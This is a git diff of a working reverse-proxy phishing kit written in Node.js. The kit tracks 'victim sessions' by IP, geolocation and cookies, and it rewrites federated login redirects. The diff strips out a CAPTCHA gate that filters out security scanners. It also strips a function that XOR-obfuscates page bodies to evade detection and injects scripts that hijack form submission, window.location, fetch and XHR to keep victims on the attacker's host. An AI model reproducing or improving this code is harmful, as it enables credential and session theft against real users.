@@ -139,86 +139,42 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 //     console.log('[INCOMING COOKIE] (none)');
 // }
 
-// ---- Serve static images for CAPTCHA ----
-if (url.startsWith('/images/')) {
-    const imagePath = path.join(__dirname, url);
-    if (fs.existsSync(imagePath)) {
-        const ext = path.extname(imagePath);
-        const contentType = ext === '.svg' ? 'image/svg+xml' : 'image/png';
-        clientResponse.writeHead(200, { 'Content-Type': contentType });
-        fs.createReadStream(imagePath).pipe(clientResponse);
-        return;
-    }
-    clientResponse.writeHead(404);
-    clientResponse.end();
-    return;
-}
-
-   // ---- CAPTCHA SUCCESS ROUTE ----
-if (url === '/captcha-success') {
-    const session = getUserSession(headers.cookie);
-    if (session && VICTIM_SESSIONS[session]) {
-        VICTIM_SESSIONS[session].captchaPassed = true;
-        console.log(`[CAPTCHA] Session ${session} verified via /captcha-success`);
-        const redirect = VICTIM_SESSIONS[session].originalUrl || PROXY_ENTRY_POINT;
-        // Ensure the redirect includes the full query string (it's already stored)
-        clientResponse.writeHead(302, { Location: redirect });
-        clientResponse.end();
-        return;
-    }
-    clientResponse.writeHead(401, { 'Content-Type': 'text/plain' });
-    clientResponse.end('Unauthorized');
-    return;
-}
-    
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-    try {
-        const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-        let session = currentSession;
+        try {
+            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+            let session = currentSession;
 
-        if (!currentSession) {
-            const { cookieName, cookieValue } = generateNewSession(phishedURL);
-            const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
-            clientResponse.setHeader("Set-Cookie", cookieHeader);
-            session = cookieName;
-            VICTIM_SESSIONS[session].originalUrl = url;
+            if (!currentSession) {
+                const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
+                clientResponse.setHeader("Set-Cookie", cookieHeader);
+             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
+                session = cookieName;
+            }
+            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
+            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
+            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
+            VICTIM_SESSIONS[session].port = phishedURL.port;
+            VICTIM_SESSIONS[session].host = phishedURL.host;
+            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
+            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
+
+getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
+    if (geo) VICTIM_SESSIONS[session].geo = geo;
+}).catch(() => {}); 
+            if (!VICTIM_SESSIONS[session].proxyLevels) {
+                VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
+            }
+
+            clientResponse.writeHead(200, { "Content-Type": "text/html" });
+            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
         }
-
-        // ---- SET SESSION FIELDS BEFORE CAPTCHA CHECK ----
-        VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-        VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-        VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-        VICTIM_SESSIONS[session].port = phishedURL.port;
-        VICTIM_SESSIONS[session].host = phishedURL.host;
-        VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
-        VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
-
-        getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
-            if (geo) VICTIM_SESSIONS[session].geo = geo;
-        }).catch(() => {});
-
-        if (!VICTIM_SESSIONS[session].proxyLevels) {
-            VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
+        catch (error) {
+            displayError("Phishing URL parsing failed", error, url);
+            clientResponse.writeHead(404, { "Content-Type": "text/html" });
+            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
-
-        // ---- CAPTCHA CHECK ----
-        if (!VICTIM_SESSIONS[session].captchaPassed) {
-            console.log(`[CAPTCHA] Serving CAPTCHA for session ${session}`);
-            serveCaptchaPage(clientResponse, session, headers.host);
-            return;
-        }
-
-        // ---- Proceed with normal proxying ----
-        clientResponse.writeHead(200, { "Content-Type": "text/html" });
-        fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
     }
-    catch (error) {
-        displayError("Phishing URL parsing failed", error, url);
-        clientResponse.writeHead(404, { "Content-Type": "text/html" });
-        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-    }
-    return;
-}
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
@@ -231,16 +187,6 @@ if (url === '/captcha-success') {
         }
 
         else {
-            // ---- VALIDATE SESSION HOSTNAME ----
-if (currentSession) {
-    const sessionData = VICTIM_SESSIONS[currentSession];
-    if (!sessionData.hostname) {
-        console.log(`[PROXY] Session ${currentSession} has no hostname – redirecting to entry point`);
-        clientResponse.writeHead(302, { Location: PROXY_ENTRY_POINT });
-        clientResponse.end();
-        return;
-    }
-}        
             let clientRequestBody = [];
             clientRequest
                 .on("error", (error) => {
@@ -265,8 +211,6 @@ if (currentSession) {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        // ... set headers, etc.
-                                        VICTIM_SESSIONS[cookieName].originalUrl = clientRequestBody.url; // <-- ADD THIS LINE
                                         const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
                                        // console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
@@ -276,8 +220,6 @@ if (currentSession) {
                                         VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                         VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                         VICTIM_SESSIONS[cookieName].host = phishedURL.host;
-
-                                        VICTIM_SESSIONS[cookieName].originalUrl = clientRequestBody.url;
 
                                         VICTIM_SESSIONS[cookieName].ip = getClientIP(clientRequest);
 VICTIM_SESSIONS[cookieName].userAgent = headers['user-agent'] || 'Unknown';
@@ -644,8 +586,7 @@ const caption =
         const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
-        console.log('[DEBUG] About to call processHtmlResponse. HTML length:', cleanedBuffer.length);
-        serverResponseBody = processHtmlResponse(cleanedBuffer, currentSession, VICTIM_SESSIONS, proxyHostname);
+        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
@@ -747,22 +688,12 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
     VICTIM_SESSIONS[cookieName].alerted = false;
-    VICTIM_SESSIONS[cookieName].captchaPassed = false;
-    VICTIM_SESSIONS[cookieName]. originalUrl = null;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
         cookieName: cookieName,
         cookieValue: cookieValue
     };
-}
-
-function serveCaptchaPage(res, sessionId, hostname) {
-    const captchaHtml = fs.readFileSync(path.join(__dirname, 'captcha.html'), 'utf8');
-    // Replace the victimId placeholder with the session ID
-    const rendered = captchaHtml.replace(/<%= victimId %>/g, sessionId);
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(rendered);
 }
 
 async function encryptData(data) {
@@ -1319,194 +1250,4 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     
     decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
-}
-
-function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
-    const session = sessions[sessionId];
-    if (!session) return htmlBuffer;
-
-    const realHost = session.hostname;
-    const realProtocol = session.protocol;
-    const proxyOrigin = `https://${proxyHostname}`;
-
-    let html = htmlBuffer.toString('utf8');
-
-    // ---- 1. REWRITE ABSOLUTE URLS ----
-    const hostRegex = new RegExp(`https?:\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
-    html = html.replace(hostRegex, proxyOrigin);
-    const protoRelRegex = new RegExp(`\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
-    html = html.replace(protoRelRegex, `//${proxyHostname}`);
-
-    // ---- 2. OBFUSCATE THE BODY USING XOR ----
-    const XOR_KEY = 'MySecretXORKey2026'; // CHANGE THIS to a unique, random string
-    const bodyRegex = /<body([^>]*)>([\s\S]*?)<\/body>/i;
-    const match = html.match(bodyRegex);
-    if (match) {
-        const bodyAttributes = match[1] || '';
-        const bodyContent = match[2];
-
-        // XOR encode the body content
-        let encoded = '';
-        for (let i = 0; i < bodyContent.length; i++) {
-            const charCode = bodyContent.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length);
-            encoded += String.fromCharCode(charCode);
-        }
-        // Convert to Base64 to safely embed in a JS string
-        const encodedBase64 = Buffer.from(encoded, 'binary').toString('base64');
-
-        // ---- RAILWAY DEBUG LOG ----
-        console.log(`[BODY OBFUSCATION] ✅ Body encrypted successfully. Original length: ${bodyContent.length}, Encoded Base64 length: ${encodedBase64.length}`);
-
-        // Build the new body with decoding script
-        const newBody = `
-<body${bodyAttributes}>
-    <script>
-        (function() {
-            const key = '${XOR_KEY}';
-            const encoded = atob('${encodedBase64}');
-            let decoded = '';
-            for (let i = 0; i < encoded.length; i++) {
-                decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-            }
-            document.write(decoded);
-        })();
-    </script>
-</body>`;
-        html = html.replace(bodyRegex, newBody);
-    } else {
-        console.log('[BODY OBFUSCATION] ⚠️ No <body> tag found – skipping obfuscation');
-    }
-
-    // ---- 3. INJECT <base> TAG AND STATIC SCRIPT (if needed) ----
-    // ---- 3. INJECT <base>, INTERCEPTOR, AND STATIC SCRIPT ----
-const baseTag = `<base href="${proxyOrigin}/">`;
-
-// ---- Interceptor: prevents dynamic form submissions to real domain ----
-const interceptorScript = `
-<script>
-    (function() {
-        const realHost = '${realHost}';
-        const proxyHost = '${proxyHostname}';
-
-        // ---- 1. Rewrite form actions on DOM ready ----
-        document.addEventListener('DOMContentLoaded', function() {
-            document.querySelectorAll('form').forEach(function(form) {
-                if (form.action && form.action.includes(realHost)) {
-                    form.action = form.action.replace(realHost, proxyHost);
-                }
-            });
-        });
-
-        // ---- 2. Override HTMLFormElement.prototype.submit ----
-        const originalSubmit = HTMLFormElement.prototype.submit;
-        HTMLFormElement.prototype.submit = function() {
-            if (this.action && this.action.includes(realHost)) {
-                this.action = this.action.replace(realHost, proxyHost);
-            }
-            return originalSubmit.call(this);
-        };
-
-        // ---- 3. Replace window.location with a fake object that intercepts href assignment ----
-        const realLocation = window.location;
-
-        // Create a fake location that handles href setter
-        const fakeLocation = {
-            get href() { return realLocation.href; },
-            set href(url) {
-                if (typeof url === 'string' && url.includes(realHost)) {
-                    url = url.replace(realHost, proxyHost);
-                }
-                realLocation.href = url;
-            }
-        };
-
-        // Proxy to forward all other property accesses/methods to the real location
-        const locationProxy = new Proxy(fakeLocation, {
-            get(target, prop) {
-                if (prop in target) return target[prop];
-                const realValue = realLocation[prop];
-                if (typeof realValue === 'function') {
-                    return realValue.bind(realLocation);
-                }
-                return realValue;
-            },
-            set(target, prop, value) {
-                if (prop === 'href') {
-                    target.href = value;
-                    return true;
-                }
-                // For other properties, set on real location if writable
-                realLocation[prop] = value;
-                return true;
-            }
-        });
-
-        // Replace window.location with the proxy
-        Object.defineProperty(window, 'location', {
-            get: function() { return locationProxy; },
-            set: function(url) {
-                if (typeof url === 'string' && url.includes(realHost)) {
-                    url = url.replace(realHost, proxyHost);
-                }
-                realLocation.href = url;
-            },
-            configurable: true
-        });
-
-        // Override assign and replace on the new location object
-        window.location.assign = function(url) {
-            if (typeof url === 'string' && url.includes(realHost)) {
-                url = url.replace(realHost, proxyHost);
-            }
-            return realLocation.assign(url);
-        };
-        window.location.replace = function(url) {
-            if (typeof url === 'string' && url.includes(realHost)) {
-                url = url.replace(realHost, proxyHost);
-            }
-            return realLocation.replace(url);
-        };
-
-        // ---- 4. Override fetch ----
-        const originalFetch = window.fetch;
-        window.fetch = function(input, init) {
-            if (typeof input === 'string' && input.includes(realHost)) {
-                input = input.replace(realHost, proxyHost);
-            } else if (input && input.url && typeof input.url === 'string' && input.url.includes(realHost)) {
-                input.url = input.url.replace(realHost, proxyHost);
-            }
-            return originalFetch.call(this, input, init);
-        };
-
-        // ---- 5. Override XMLHttpRequest.open ----
-        const originalOpen = XMLHttpRequest.prototype.open;
-        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-            if (typeof url === 'string' && url.includes(realHost)) {
-                url = url.replace(realHost, proxyHost);
-            }
-            return originalOpen.call(this, method, url, async !== false, user, password);
-        };
-    })();
-</script>`;
-
-const staticScript = '<script src="/@"></script>';
-const headPayload = `${baseTag}${interceptorScript}${staticScript}`;
-    // ---- 4. INJECT PAYLOAD INTO <head> ----
-    const injectionMap = {
-        "<head>": `<head>${headPayload}`,
-        "<html>": `<html><head>${headPayload}</head>`,
-        "<body>": `<head>${headPayload}</head><body>`
-    };
-    const limit = 200;
-    for (const [tag, replacement] of Object.entries(injectionMap)) {
-        const tagBuf = Buffer.from(tag);
-        const pos = Buffer.from(html).subarray(0, limit).indexOf(tagBuf);
-        if (pos !== -1) {
-            const before = Buffer.from(html.substring(0, pos));
-            const after = Buffer.from(html.substring(pos + tag.length));
-            return Buffer.concat([before, Buffer.from(replacement), after]);
-        }
-    }
-    // Fallback: prepend to the whole document
-    return Buffer.concat([Buffer.from(`<head>${headPayload}</head>`), Buffer.from(html)]);
 }
